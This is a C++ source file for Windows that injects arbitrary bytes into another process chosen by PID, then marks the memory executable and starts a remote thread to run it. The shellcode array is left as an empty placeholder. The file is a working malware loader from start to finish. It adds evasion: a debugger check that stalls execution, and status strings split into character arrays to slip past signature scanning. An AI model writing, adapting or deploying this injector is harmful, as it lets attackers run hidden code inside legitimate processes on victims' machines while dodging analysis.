#include <cstdio>
#include <Windows.h>

DWORD dwPID = 0;	//32 bit unsigned int 

//put your data here in the 0x00,0x00 format
const UCHAR MY_Data[] = { 0 };

SIZE_T szMY_Data = sizeof(MY_Data);

int do_sleep() {
	DWORD sleep_time = 1000000;
	Sleep(sleep_time);
	return EXIT_FAILURE;
}


int main(int argc, char* argv[]) {

	if (IsDebuggerPresent() != 0) {
		char string[] = {'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', ' ', 'D', 'e', 't', 'e', 'c', 't', 'e', 'd', '\0'};
		printf("[!] %s", string);
		do_sleep();
		return EXIT_FAILURE;
	}

	//Ensure user supplied PID at the command line 
	if (argc < 2) {
		printf("[!] Usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	dwPID = atoi(argv[1]); //Convert the user supplied pid to an int


	//Get handle to process baesd on user supplied PID
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPID);
	//if return value is NULL something went wrong and we could not get the handle 
	if (handle == NULL) {
		//Did the user give us a pid at a high privelege level
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			char fail[] = { 'A','c','c','e','s','s',' ','D','e','n','i','e','d','\0' };
			printf("[!] %s\n", fail);
			return EXIT_FAILURE;
		}
		//Did the user give us a pid that does not exist
		else if (GetLastError() == ERROR_INVALID_PARAMETER) {
			char fail[] = { 'P','I','D',' ','D','o','e','s',' ','n','o','t',' ','E','x','i','s','t','\0' };
			printf("[!] %s\n", fail);
			return EXIT_FAILURE;
		}
		else {
			//Everything went well and we got a handle to the specified process 
			//printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
			char no_handle[] = { 'F','a','i','l','e','d',' ','t','o',' ','G','e','t','H','a','n','d','l','e','\0' };
			printf("[!] %s: 0x%p\n", no_handle, GetLastError());
			return EXIT_FAILURE;
		}
	}

	char get_handle[] = { 'G','o','t',' ','H','a','n','d','l','e',' ','t','o',' ','t','h','e',' ','P','r','o','c','e','s','s','\0' };
	printf("[+] %s: 0x%p\n", get_handle, handle);

	LPVOID myAllocation = VirtualAllocEx(
		handle,						//Return back a handle to this process
		NULL,						//Let windows decide where to alloc the memory
		szMY_Data,					//Size of cString
		MEM_COMMIT | MEM_RESERVE,	//Commit and reserve in one step 
		PAGE_READWRITE);			//Memory Constant 
	
	//if NULL returned something didnt work 
	if (myAllocation == NULL) {
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			char no_access[] = { 'F','a','i','l','e','d',' ','t','o',' ','w','r','i','t','e',' ','m','e','m','o','r','y',',',' ','A','c','c','e','s','s',' ','D','e','n','i','e','d','\0' };
			printf("[!] %s\n", no_access);
			if (handle) {
				char close_handle[] = { 'C','l','o','s','i','n','g',' ','H','a','n','d','l','e',' ','t','o',' ','P','r','o','c','e','s','s','\0' };
				printf("[+] %s\n", close_handle);
				CloseHandle(handle);
			}
		}
		else {
			char no_memory[] = { 'F','a','i','l','e','d',' ','t','o',' ','a','l','l','o','c','a','t','e',' ','m','e','m','o','r','y','\0' };
			printf("[!] %s: 0x%p\n", no_memory, GetLastError());
			if (handle) {
				char close_handle[] = { 'C','l','o','s','i','n','g',' ','H','a','n','d','l','e',' ','t','o',' ','P','r','o','c','e','s','s','\0' };
				printf("[+] %s\n", close_handle);
				CloseHandle(handle);
			}
		}
	}
	
	//Returns back the base address of allocated memory
	char alloc_mem[] = { 'A','l','o','c','a','t','e','d',' ','m','e','m','o','r','y',',',' ','b','a','s','e',' ','a','d','d','r','e','s','s','\0' };
	printf("[+] %s: 0x%p\n", alloc_mem, myAllocation);

	//Now lets write our string to memory 
	//handle --> the handle to the process we want to inject into 
	//myAllocation --> the base address returned back by VritualAllocEx
	//&cString --> pointer to the thing we are writing 
	//nSize --> the size of the thing we are writing 
	//NULL --> dont care about this, can be ignored 
	BOOL writeMemory = WriteProcessMemory(handle, myAllocation, MY_Data, szMY_Data, NULL);
	if (writeMemory) {
		char write_data[] = { 'S','u','c','c','e','s','s','f','u','l','l','y',' ','w','r','o','t','e',' ','d','a','t','a',' ','i','n','t','o',' ','t','a','r','g','e','t',' ','p','r','o','c','e','s','s','\0' };
		printf("[+] %s\n", write_data);
	}
	else {
		char failed_write[] = { 'F','a','i','l','e','d',' ','t','o',' ','w','r','i','t','e',' ','d','a','t','a',' ','i','n','t','o',' ','t','a','r','g','e','t',' ','p','r','o','c','e','s','s',' ','m','e','m','o','r','y','\0' };
		printf("[!] %s: 0x%p\n", failed_write, GetLastError());
		return EXIT_FAILURE;
	}

	//change memory protections here 
	DWORD flOldProtect = 0;		//holds the old memory constant 

	BOOL changePerms = VirtualProtectEx(handle, myAllocation, szMY_Data, PAGE_EXECUTE, &flOldProtect);

	if (changePerms == 0) {
		char failed_change[] = { 'F','a','i','l','e','d',' ','t','o',' ','c','h','a','n','g','e',' ','m','e','m','o','r','y',' ','p','e','r','m','i','s','s','i','o','n','s','\0' };
		printf("[!] %s: 0x%p\n", failed_change, GetLastError);
		return EXIT_FAILURE;
	}

	char changed[] = { 'C','h','a','n','g','e','d',' ','m','e','m','o','r','y',' ','p','e','r','m','i','s','i','o','n','s',' ','t','o',' ','R','W','X',' ',':',')','\0' };
	printf("[+] %s\n", changed);



	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
	if (cThread == NULL) {
		char failed_thread[] = { 'C','o','u','l','d',' ','n','o','t',' ','c','r','e','a','t','e',' ','T','h','r','e','a','d',' ','i','n',' ','p','r','o','c','e','s','s','\0' };
		printf("[!] %s: 0x%p\n", failed_thread, GetLastError());
		if (cThread) {
			char k_thread[] = { 'K','i','l','l','i','n','g',' ','I','n','j','e','c','t','e','d',' ','T','h','r','e','a','d','\0' };
			printf("[+] %s\n", k_thread);
			CloseHandle(cThread);
			return EXIT_FAILURE;
		}
	}

	char c_thread[] = { 'C','r','e','a','t','e','d',' ','T','h','r','e','a','d',' ','i','n',' ','p','r','o','c','e','s','s',',',' ','h','a','n','d','l','e','\0' };
	printf("[+] %s: 0x%p\n", c_thread, cThread);

	WaitForSingleObject(cThread, INFINITE);
	char t_finished[] = { 'T','h','r','e','a','d',' ','f','i','n','i','s','h','e','d',' ','e','x','e','c','u','t','i','o','n','\0' };
	printf("[+] %s\n", t_finished);



}